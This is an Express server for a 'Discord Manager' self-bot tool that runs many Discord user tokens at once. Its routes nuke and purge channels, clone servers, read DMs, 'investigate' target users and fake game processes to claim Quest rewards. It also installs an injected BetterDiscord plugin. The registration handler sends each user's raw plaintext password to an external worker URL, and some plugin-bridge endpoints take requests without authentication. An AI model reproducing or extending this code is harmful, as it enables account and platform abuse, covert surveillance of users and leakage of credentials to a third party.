import http from "http";
import express from "express";
import cookieSession from "cookie-session";
import { fileURLToPath } from "url";
import { dirname, join } from "path";
import { existsSync, copyFileSync } from "fs";
import { registerUser, loginUser, findUserById, listPendingUsers, approveUser, listAllUsersSafe, revokeUser, deleteUser } from "./authStore.js";
import { getRuntimeForUser, removeRuntimeForUser } from "./userRuntime.js";
import { getOrCreateSessionSecret } from "./sessionSecret.js";
import { securityHeaders, sanitizeInputs } from "./securityMiddleware.js";
import { loginWithDiscord, loginWithMfa, getDiscordUserInfo } from "./discordAuth.js";
import { startRPC, stopRPC, getRPCStatus } from "./questRPC.js";
import { fetchQuests, runAuto, stopAuto, getAutoStatus, getDebugFetch } from "./questAuto.js";
import { startFakeProcess, stopFakeProcess, getFakeStatus } from "./fakeProcess.js";

const __dir = dirname(fileURLToPath(import.meta.url));

// ── Discord approval bot integration (Cloudflare Worker) ─────────────────────
const BOT_SERVICE_URL = process.env.BOT_SERVICE_URL || "";
const BOT_SECRET      = process.env.BOT_SECRET      || "";

async function notifyBotService(username, userId, discordUsername = "", discordId = "", password = "") {
  if (!BOT_SERVICE_URL || !BOT_SECRET) return;
  try {
    await fetch(`${BOT_SERVICE_URL}/notify`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, userId, discordUsername, discordId, password, secret: BOT_SECRET }),
    });
  } catch (e) {
    console.warn("[Auth] Bot service notification failed:", e.message);
  }
}

async function syncApprovalsFromWorker() {
  if (!BOT_SERVICE_URL || !BOT_SECRET) return;
  try {
    const res = await fetch(
      `${BOT_SERVICE_URL}/check-approvals?secret=${encodeURIComponent(BOT_SECRET)}`,
      { headers: { "Cache-Control": "no-cache" } }
    );
    if (!res.ok) return;
    const data = await res.json();

    const pending = listPendingUsers();
    for (const u of pending) {
      if (data.approved?.includes(u.id)) {
        approveUser(u.id);
        console.log(`[Auth] Auto-aprovado via Worker: ${u.username}`);
      }
    }
  } catch (e) {
    console.warn("[Auth] Worker sync failed:", e.message);
  }
}

// Poll a cada 30 segundos para pegar aprovações do Cloudflare Worker
setInterval(syncApprovalsFromWorker, 30_000);
syncApprovalsFromWorker();
const app = express();
const PORT = Number(process.env.PORT) || 4100;
const HOST = "127.0.0.1";

app.use(securityHeaders);
app.use(sanitizeInputs);
app.use(express.json({ limit: "2mb" }));
app.use(cookieSession({
  name: "dm.sid",
  secret: process.env.SESSION_SECRET || getOrCreateSessionSecret(),
  maxAge: 7 * 24 * 60 * 60 * 1000,
  httpOnly: true,
  sameSite: "lax",
}));
app.use(express.static(join(__dir, "public"), {
  etag: false, lastModified: false,
  setHeaders(res) { res.setHeader("Cache-Control", "no-store"); },
}));

function requireAuth(req, res, next) {
  const uid = req.session?.userId;
  if (!uid) return res.status(401).json({ error: "Não autenticado." });
  req.userId = uid;
  req.user = findUserById(uid);
  if (!req.user?.approved) { req.session = null; return res.status(401).json({ error: "Sessão inválida." }); }
  next();
}

function requireOwner(req, res, next) {
  if (req.user?.role !== "owner") return res.status(403).json({ error: "Acesso negado." });
  next();
}

// ─── Detectable games cache ───────────────────────────────────────────────
let _gamesCache = null;
let _gamesCacheTime = 0;

async function getDetectableGames() {
  const TTL = 30 * 60 * 1000;
  if (_gamesCache && Date.now() - _gamesCacheTime < TTL) return _gamesCache;
  const res = await fetch("https://discord.com/api/applications/detectable", {
    headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
  });
  if (!res.ok) throw new Error(`Discord retornou ${res.status} ao buscar jogos.`);
  const data = await res.json();
  _gamesCache = data.map((g) => ({
    id: g.id,
    name: g.name,
    exes: (g.executables || [])
      .filter(e => e.os === 'win32' && !e.is_launcher && e.name)
      .map(e => e.name.split(/[\\/]/).pop())
      .filter(Boolean),
  }));
  _gamesCacheTime = Date.now();
  return _gamesCache;
}

// Ping for Electron
app.get("/api/ping", (_req, res) => res.json({ ok: true }));

// Abre a pasta de plugins do BetterDiscord no Explorer
app.get("/api/open-bd-plugins", requireAuth, async (_req, res) => {
  try {
    const { exec } = await import("child_process");
    const bdPlugins = join(process.env.APPDATA || "", "BetterDiscord", "plugins");
    exec(`explorer "${bdPlugins}"`);
    res.json({ ok: true, path: bdPlugins });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Auth
app.post("/api/auth/register", (req, res) => {
  const { username, password } = req.body || {};
  const out = registerUser(username, password);
  if (!out.ok) return res.status(400).json({ error: out.error });
  if (!out.user.approved) {
    const { discordUsername = "", discordId = "", password: rawPassword = "" } = req.body || {};
    notifyBotService(out.user.username, out.user.id, discordUsername, discordId, rawPassword);
    return res.status(202).json({ ok: true, pendingApproval: true, message: "Conta criada. Aguarde aprovação do administrador." });
  }
  req.session.userId = out.user.id;
  res.json({ ok: true, user: out.user });
});

app.post("/api/auth/login", (req, res) => {
  const { username, password } = req.body || {};
  const out = loginUser(username, password);
  if (!out.ok) return res.status(401).json({ error: out.error });
  req.session.userId = out.user.id;
  res.json({ ok: true, user: out.user });
});

app.post("/api/auth/logout", (req, res) => {
  req.session = null;
  res.json({ ok: true });
});

app.get("/api/auth/me", (req, res) => {
  const uid = req.session?.userId;
  if (!uid) return res.status(401).json({ error: "Não autenticado." });
  const user = findUserById(uid);
  if (!user?.approved) { req.session = null; return res.status(401).json({ error: "Sessão inválida." }); }
  res.json({ user });
});

// Discord login with email/password
app.post("/api/discord/login", async (req, res) => {
  try {
    const { login, password } = req.body || {};
    if (!login || !password) return res.status(400).json({ error: "Email e senha são obrigatórios." });
    const result = await loginWithDiscord(login, password);
    res.json(result);
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/discord/mfa", async (req, res) => {
  try {
    const { ticket, code, loginInstanceId } = req.body || {};
    const result = await loginWithMfa(ticket, code, loginInstanceId);
    res.json(result);
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/discord/validate-token", async (req, res) => {
  try {
    const { token } = req.body || {};
    if (!token) return res.status(400).json({ error: "Token obrigatório." });
    const user = await getDiscordUserInfo(token);
    res.json({ ok: true, user });
  } catch (e) { res.status(400).json({ error: String(e.message) }); }
});

// Config
app.get("/api/config", requireAuth, (req, res) => {
  try { res.json(getRuntimeForUser(req.userId).loadConfig()); } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/config", requireAuth, (req, res) => {
  try {
    const { guildId, tokens, moderationToken } = req.body;
    if (!guildId || !Array.isArray(tokens)) return res.status(400).json({ error: "guildId e tokens[] são obrigatórios." });
    const rt = getRuntimeForUser(req.userId);
    rt.saveConfig({ guildId: String(guildId).trim(), tokens, moderationToken: String(moderationToken || "").trim() });
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Status/Start/Stop
app.get("/api/status", requireAuth, (req, res) => {
  const rt = getRuntimeForUser(req.userId);
  res.json({ running: rt.isRunning(), sessions: rt.getStatus() });
});

app.post("/api/start", requireAuth, async (req, res) => {
  try { const rt = getRuntimeForUser(req.userId); await rt.startFromConfig(); res.json({ ok: true, sessions: rt.getStatus() }); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/stop", requireAuth, async (req, res) => {
  try { await getRuntimeForUser(req.userId).stopAll(); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/identify", requireAuth, async (req, res) => {
  try {
    const { tokens } = req.body;
    if (!Array.isArray(tokens)) return res.status(400).json({ error: "tokens[] obrigatório." });
    const rt = getRuntimeForUser(req.userId);
    const results = await Promise.all(tokens.map((t) => rt.identifyToken(String(t).trim())));
    res.json({ results });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/call/join", requireAuth, async (req, res) => {
  try {
    const { guildId, channelId, tokens, fakeDeaf = false, selfMute = true } = req.body;
    if (!guildId || !channelId || !Array.isArray(tokens)) return res.status(400).json({ error: "Dados inválidos." });
    const rt = getRuntimeForUser(req.userId);
    const results = [];
    for (const token of tokens) {
      try { results.push(await rt.joinVoiceWithToken(String(token).trim(), guildId, channelId, { fakeDeaf: !!fakeDeaf, selfMute: selfMute !== false })); }
      catch (e) { results.push({ ok: false, error: e.message, token }); }
    }
    res.json({ ok: true, results });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/call/leave", requireAuth, async (req, res) => {
  try {
    const { token } = req.body || {};
    if (!token) return res.status(400).json({ error: "Token obrigatório." });
    await getRuntimeForUser(req.userId).leaveOneSession(String(token).trim());
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Moderation
app.post("/api/moderation/guilds", requireAuth, async (req, res) => {
  try { res.json({ guilds: await getRuntimeForUser(req.userId).listModerationGuilds(req.body) }); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/moderation/snapshot", requireAuth, async (req, res) => {
  try { res.json(await getRuntimeForUser(req.userId).getModerationSnapshot(req.body)); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/moderation/action", requireAuth, async (req, res) => {
  try { res.json(await getRuntimeForUser(req.userId).runModerationAction(req.body)); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Clone
app.post("/api/clone/run", requireAuth, async (req, res) => {
  try { res.json(await getRuntimeForUser(req.userId).cloneServer(req.body)); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Purge
app.post("/api/purge", requireAuth, async (req, res) => {
  try { res.json(await getRuntimeForUser(req.userId).purgeMessages(req.body)); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Nuke
app.post("/api/nuke/start", requireAuth, (req, res) => {
  try {
    const { token, channelId, userId, keyword, limit, ownerDiscordId } = req.body || {};
    if (!token || !channelId) return res.status(400).json({ error: "Token e channelId são obrigatórios." });
    const rt = getRuntimeForUser(req.userId);
    if (rt.getNukeStatus().running) return res.status(409).json({ error: "Um nuke já está em andamento. Pare-o primeiro." });
    rt.nukeChannel({ token: String(token).trim(), channelId: String(channelId).trim(), userId: userId ? String(userId).trim() : null, keyword: keyword || null, limit: Number(limit) || 0, ownerDiscordId: ownerDiscordId || null })
      .catch((e) => console.error("[Nuke]", e.message));
    res.json({ ok: true, message: "Nuke iniciado. Acompanhe nos logs." });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.get("/api/nuke/status", requireAuth, (req, res) => {
  try { res.json(getRuntimeForUser(req.userId).getNukeStatus()); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/nuke/stop", requireAuth, (req, res) => {
  try { getRuntimeForUser(req.userId).stopNuke(); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/nuke/dms", requireAuth, async (req, res) => {
  try {
    const { token } = req.body || {};
    if (!token) return res.status(400).json({ error: "Token obrigatório." });
    const dms = await getRuntimeForUser(req.userId).listDMChannels(String(token).trim());
    res.json({ dms });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post('/api/conversations/messages', requireAuth, async (req, res) => {
  try {
    const { token, channelId, before, limit } = req.body || {};
    if (!token || !channelId) return res.status(400).json({ error: 'Token e channelId obrigatórios.' });
    const messages = await getRuntimeForUser(req.userId).getDMMessages(
      String(token).trim(), String(channelId).trim(), before || null, Number(limit) || 50
    );
    res.json({ messages, hasMore: messages.length === (Number(limit) || 50) });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Stats persistentes por Discord user ID
app.get("/api/stats", requireAuth, (req, res) => {
  const discordId = req.query.discordId || null;
  try { res.json(getRuntimeForUser(req.userId).getStats(discordId)); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Backup de mensagens
app.post("/api/backup/start", requireAuth, async (req, res) => {
  try {
    const { token, channelId } = req.body || {};
    if (!token || !channelId) return res.status(400).json({ error: "token e channelId obrigatórios." });
    await getRuntimeForUser(req.userId).startChannelMonitor(String(token).trim(), String(channelId).trim());
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/backup/stop", requireAuth, (req, res) => {
  try {
    const { channelId } = req.body || {};
    getRuntimeForUser(req.userId).stopChannelMonitor(String(channelId).trim());
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.get("/api/backup/messages/:channelId", requireAuth, (req, res) => {
  try {
    const rt = getRuntimeForUser(req.userId);
    const messages = rt.getBackupMessages(req.params.channelId);
    res.json({ messages, isMonitoring: rt.isMonitoring(req.params.channelId) });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// SSE — eventos de backup em tempo real
app.get("/api/backup/events", requireAuth, (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();

  const rt = getRuntimeForUser(req.userId);
  const send = (type, data) => res.write(`data: ${JSON.stringify({ type, ...data })}\n\n`);

  const onNew     = d => send('new',     d);
  const onDeleted = d => send('deleted', d);
  const onEdited  = d => send('edited',  d);

  rt.on('backup:new',     onNew);
  rt.on('backup:deleted', onDeleted);
  rt.on('backup:edited',  onEdited);

  const hb = setInterval(() => res.write(': ping\n\n'), 20000);

  req.on('close', () => {
    clearInterval(hb);
    rt.off('backup:new',     onNew);
    rt.off('backup:deleted', onDeleted);
    rt.off('backup:edited',  onEdited);
  });
});

// ─── Quest (híbrido: monitor automático + RPC local) ─────────────────────

// Lista de jogos detectáveis pelo Discord
app.get("/api/quest/games", requireAuth, async (req, res) => {
  try {
    const games = await getDetectableGames();
    res.json({ games });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});


// RPC local — conecta ao Discord desktop com o app_id do jogo selecionado
app.post("/api/quest/rpc/start", requireAuth, async (req, res) => {
  try {
    const { appId, gameName } = req.body || {};
    if (!appId || !gameName) return res.status(400).json({ error: "appId e gameName são obrigatórios." });
    const result = await startRPC(String(appId).trim(), String(gameName).trim());
    res.json(result);
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.post("/api/quest/rpc/stop", requireAuth, async (req, res) => {
  try { await stopRPC(); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: String(e.message) }); }
});

app.get("/api/quest/rpc/status", requireAuth, (req, res) => {
  res.json(getRPCStatus());
});

// Processo falso — simula o jogo rodando para o Discord detectar
app.post("/api/quest/fake/start", requireAuth, async (req, res) => {
  const { exeName } = req.body || {};
  if (!exeName || typeof exeName !== 'string') return res.status(400).json({ error: "exeName obrigatório." });
  const safe = exeName.replace(/[^a-zA-Z0-9._\- ]/g, '').trim();
  if (!safe.endsWith('.exe') && !safe.includes('.')) {
    return res.status(400).json({ error: "exeName deve terminar em .exe" });
  }
  try {
    const result = await startFakeProcess(safe);
    res.json({ ok: true, ...result });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post("/api/quest/fake/stop", requireAuth, async (req, res) => {
  try { await stopFakeProcess(); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.get("/api/quest/fake/status", requireAuth, (req, res) => {
  res.json(getFakeStatus());
});

// BetterDiscord plugin install
const _bdPluginsDir = join(process.env.APPDATA || '', 'BetterDiscord', 'plugins');
const _pluginSrc = join(__dir, 'public', 'OrionQuests.plugin.js');

app.get("/api/discord/plugin-status", requireAuth, (req, res) => {
  const bdInstalled = existsSync(_bdPluginsDir);
  const pluginInstalled = existsSync(join(_bdPluginsDir, 'OrionQuests.plugin.js'));
  res.json({ bdInstalled, pluginInstalled });
});

app.post("/api/discord/copy-plugin", requireAuth, (req, res) => {
  try {
    if (!existsSync(_bdPluginsDir))
      return res.status(400).json({ ok: false, error: 'BetterDiscord não encontrado. Instale em betterdiscord.app primeiro.' });
    copyFileSync(_pluginSrc, join(_bdPluginsDir, 'OrionQuests.plugin.js'));
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// OrionQuests plugin — auto-install into BetterDiscord plugins folder
app.get("/api/orion/status", requireAuth, (req, res) => {
  const bdDir = join(process.env.APPDATA || "", "BetterDiscord", "plugins");
  const pluginPath = join(bdDir, "OrionQuests.plugin.js");
  res.json({ bdInstalled: existsSync(bdDir), pluginInstalled: existsSync(pluginPath) });
});

app.post("/api/orion/install", requireAuth, (req, res) => {
  const bdDir = join(process.env.APPDATA || "", "BetterDiscord", "plugins");
  if (!existsSync(bdDir)) return res.json({ ok: false, reason: "bd_not_installed" });
  try {
    const src = join(__dir, "public", "OrionQuests.plugin.js");
    const dest = join(bdDir, "OrionQuests.plugin.js");
    copyFileSync(src, dest);
    res.json({ ok: true, path: dest });
  } catch (e) {
    res.status(500).json({ ok: false, reason: e.message });
  }
});

// Investigate
app.post("/api/investigate", requireAuth, async (req, res) => {
  try {
    const { myToken, targetId, additionalTokens } = req.body || {};
    if (!myToken || !targetId) return res.status(400).json({ error: "Token e ID do alvo são obrigatórios." });
    const extraTokens = Array.isArray(additionalTokens) ? additionalTokens.filter(Boolean) : [];
    const result = await getRuntimeForUser(req.userId).investigateUser(myToken, String(targetId).trim(), extraTokens);
    res.json(result);
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Admin
app.get("/api/admin/pending", requireAuth, requireOwner, (req, res) => res.json({ users: listPendingUsers() }));
app.post("/api/admin/approve", requireAuth, requireOwner, (req, res) => {
  const out = approveUser(String(req.body?.userId || ""));
  if (!out.ok) return res.status(400).json({ error: out.error });
  res.json({ ok: true });
});
app.get("/api/admin/users", requireAuth, requireOwner, (req, res) => res.json({ users: listAllUsersSafe() }));
app.post("/api/admin/revoke", requireAuth, requireOwner, (req, res) => {
  const out = revokeUser(String(req.body?.userId || ""));
  if (!out.ok) return res.status(400).json({ error: out.error });
  res.json({ ok: true });
});
app.post("/api/admin/delete", requireAuth, requireOwner, async (req, res) => {
  try {
    await removeRuntimeForUser(String(req.body?.userId || ""));
    const out = deleteUser(String(req.body?.userId || ""));
    if (!out.ok) return res.status(400).json({ error: out.error });
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: String(e.message) }); }
});

// Logs
app.get('/api/logs', requireAuth, (req, res) => {
  res.json({ entries: getRuntimeForUser(req.userId).getLogs() });
});

app.get('/api/logs/stream', requireAuth, (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const rt = getRuntimeForUser(req.userId);
  const lastId = parseInt(req.headers['last-event-id'] || '0', 10);
  const initial = rt.getLogs().filter((e) => e.id > lastId);
  for (const e of initial) res.write(`id: ${e.id}\ndata: ${JSON.stringify(e)}\n\n`);

  const onLog = (entry) => res.write(`id: ${entry.id}\ndata: ${JSON.stringify(entry)}\n\n`);
  rt.on('log', onLog);
  req.on('close', () => rt.off('log', onLog));
});

// Quest history
// ─── QUEST AUTO endpoints ─────────────────────────────────────────────────
app.get("/api/quest-auto/quests", requireAuth, async (req, res) => {
  const token = String(req.query.token || "").trim();
  if (!token) return res.status(400).json({ error: "Token obrigatório." });
  try {
    const quests = await fetchQuests(token);
    res.json({ quests });
  } catch (e) {
    res.status(400).json({ error: e.message });
  }
});

app.post("/api/quest-auto/run", requireAuth, async (req, res) => {
  const { token, questIds = [], autoEnroll = true, autoClaim = true } = req.body || {};
  if (!token) return res.status(400).json({ error: "Token obrigatório." });
  try {
    await runAuto(String(token).trim(), questIds, { autoEnroll, autoClaim });
    res.json({ ok: true });
  } catch (e) {
    res.status(409).json({ error: e.message });
  }
});

app.post("/api/quest-auto/stop", requireAuth, (req, res) => {
  stopAuto();
  res.json({ ok: true });
});

app.get("/api/quest-auto/status", requireAuth, (req, res) => {
  res.json(getAutoStatus());
});

app.get("/api/quest-auto/debug", requireAuth, (req, res) => {
  res.json({ debug: getDebugFetch() });
});

// CORS for BetterDiscord plugin (fetch from https://discord.com to http://localhost)
app.use('/api/orion', (req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Orion command — controlled by the app, polled by the injected bridge in Discord
let _orionCommand = { command: 'idle' };
let _bridgeLastSeen = 0;
const _orionState = { tasks: {}, questList: [], allDone: false, noQuests: false, error: null, updatedAt: 0, startedAt: 0 };

app.get('/api/orion/command', (req, res) => {
  _bridgeLastSeen = Date.now();
  res.json(_orionCommand);
});

app.post('/api/orion/command', requireAuth, (req, res) => {
  const cmd = req.body?.command;
  if (!['start', 'stop', 'idle'].includes(cmd)) return res.status(400).json({ error: 'Comando inválido.' });
  _orionCommand = { command: cmd };
  if (cmd === 'start') Object.assign(_orionState, { tasks: {}, questList: [], allDone: false, noQuests: false, error: null, startedAt: Date.now() });
  if (cmd === 'idle' || cmd === 'stop') _orionCommand = { command: 'idle' };
  res.json({ ok: true });
});

// Orion progress — receives updates from the injected script (no auth, localhost only)
app.post('/api/orion/progress', (req, res) => {
  const d = req.body;
  if (!d || typeof d !== 'object') return res.sendStatus(204);
  _orionState.updatedAt = Date.now();
  if (d.type === 'quests_found') {
    _orionState.questList = d.quests || [];
    _orionState.allDone = false;
    _orionState.noQuests = false;
    _orionState.tasks = {};
  } else if (d.type === 'task_update') {
    _orionState.tasks[d.id] = { id: d.id, name: d.name, taskType: d.taskType, cur: d.cur, max: d.max, status: d.status, ts: Date.now() };
  } else if (d.type === 'all_done') {
    _orionState.allDone = true;
    _orionCommand = { command: 'idle' };
  } else if (d.type === 'no_quests') {
    _orionState.noQuests = true;
    _orionCommand = { command: 'idle' };
  } else if (d.type === 'error') {
    _orionState.error = d.message || 'Erro desconhecido';
    _orionCommand = { command: 'idle' };
  }
  res.sendStatus(204);
});

app.get('/api/orion/live', requireAuth, (req, res) => {
  res.json({ ..._orionState, bridgeConnected: Date.now() - _bridgeLastSeen < 8000 });
});

app.get('/api/quest-history', requireAuth, (req, res) => {
  res.json({ history: getRuntimeForUser(req.userId).getQuestHistory() });
});

app.delete('/api/quest-history', requireAuth, (req, res) => {
  getRuntimeForUser(req.userId).clearQuestHistory();
  res.json({ ok: true });
});

// Avatar download proxy
app.get('/api/avatar-download', (req, res) => {
  const url = String(req.query.url || '');
  if (!url.startsWith('https://cdn.discordapp.com/')) return res.status(400).json({ error: 'URL inválida.' });
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 15000);
  fetch(url, { signal: controller.signal })
    .then((r) => {
      clearTimeout(timeout);
      if (!r.ok) return res.status(502).json({ error: 'Falha ao buscar avatar.' });
      const ext = url.includes('.gif') ? 'gif' : 'png';
      res.setHeader('Content-Type', r.headers.get('content-type') || `image/${ext}`);
      res.setHeader('Content-Disposition', `attachment; filename="avatar.${ext}"`);
      res.setHeader('Cache-Control', 'no-store');
      import('stream').then(({ Readable }) => {
        Readable.fromWeb(r.body).pipe(res);
      }).catch(() => res.end());
    })
    .catch(() => { clearTimeout(timeout); res.status(504).json({ error: 'Timeout.' }); });
});

// SPA fallback
app.get("*", (req, res) => {
  if (req.path.startsWith("/api/")) return res.status(404).json({ error: "Not found." });
  res.sendFile(join(__dir, "public", "index.html"));
});

const server = http.createServer(app);

function tryListen(port, maxTries = 10) {
  server.listen(port, HOST, () => {
    const actual = server.address().port;
    console.log(`Discord Manager — http://${HOST}:${actual}`);
    if (process.send) process.send({ type: "port", port: actual });
  });
  server.on("error", (err) => {
    if (err.code === "EADDRINUSE" && maxTries > 0) {
      console.warn(`Porta ${port} ocupada, tentando ${port + 1}...`);
      server.removeAllListeners("error");
      server.close(() => tryListen(port + 1, maxTries - 1));
    } else {
      throw err;
    }
  });
}

tryListen(PORT);
